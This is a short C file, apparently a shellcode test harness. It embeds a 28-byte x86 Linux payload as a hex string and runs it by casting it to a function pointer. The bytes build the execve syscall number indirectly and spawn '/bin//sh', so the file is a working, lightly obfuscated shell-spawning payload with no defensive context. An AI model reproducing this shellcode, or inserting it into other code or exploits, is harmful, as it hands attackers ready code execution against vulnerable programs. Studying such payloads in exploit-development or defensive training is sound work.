/*
 * Put your assembler file here
 */

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
		       "\x29\xc0\xb0\x17\x2c\xc\x31\xc9\x31\xd2\xeb\x03\x5b\xcd\x80\xe8\xf8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68";

int main(int argc, char **argv)
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}

	
